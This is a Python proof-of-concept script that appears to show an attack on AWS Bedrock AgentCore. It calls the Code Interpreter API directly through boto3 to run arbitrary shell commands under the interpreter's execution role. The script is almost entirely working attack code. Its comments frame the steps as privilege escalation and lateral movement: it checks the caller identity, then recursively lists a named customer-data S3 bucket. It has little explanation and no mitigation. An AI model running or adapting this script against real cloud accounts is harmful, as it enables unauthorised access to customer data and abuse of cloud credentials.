#This Python script demonstrates the attack vector. It uses the boto3 client to bypass the Agent layer entirely and directly invoke the Code Interpreter API with arbitrary shell commands.

import boto3
import time

# --- Configuration ---
# Target Resource Identifiers
INTERPRETER_ID = "CODE_INTERPRETER_XYZ" 
REGION = "us-east-1"
# In a real scenario, this bucket name would be discovered via enumeration
TARGET_BUCKET = "bedrock-agentcore-customer-data-prod"

# Initialize the Bedrock AgentCore client
# NOTE: We are NOT using 'bedrock-agent-runtime'. 
# We are using the lower-level API to hit the interpreter directly.
client = boto3.client('bedrock-agent-core', region_name=REGION)

def run_remote_shell(command):
    """
    Directly invokes the Code Interpreter to execute a system shell command.
    No prompt injection involved - this is direct code execution.
    """
    print(f"\n[*] Sending shell command: '{command}'...")

    # We inject raw Python code that imports the os module
    # and executes the shell command in the remote runtime.
    payload_code = f"""
import os
print(os.popen('{command}').read())
    """

    try:
        # 1. Start a session
        session = client.start_code_interpreter_session(
            interpreterId=INTERPRETER_ID
        )
        session_id = session['sessionId']

        # 2. Invoke the interpreter directly with code
        response = client.invoke_code_interpreter(
            sessionId=session_id,
            interpreterId=INTERPRETER_ID,
            code=payload_code
        )

        # 3. Process the output
        output_text = response.get('output', {}).get('text', '')
        
        print("\n[+] --- Interpreter Output ---")
        print(output_text)
        print("------------------------------")

    except Exception as e:
        print(f"[-] Error invoking interpreter: {e}")

if __name__ == "__main__":
    print("--- Starting Code Interpreter Privilege Escalation ---")

    # Step 1: Proof of Identity
    # Verify we are running as the Execution Role
    run_remote_shell("aws sts get-caller-identity")

    # Step 2: Lateral Movement
    # Enumerate S3 buckets using the assumed role
    run_remote_shell(f"aws s3 ls s3://{TARGET_BUCKET} --recursive")

    print("\n--- Exploit Complete ---")
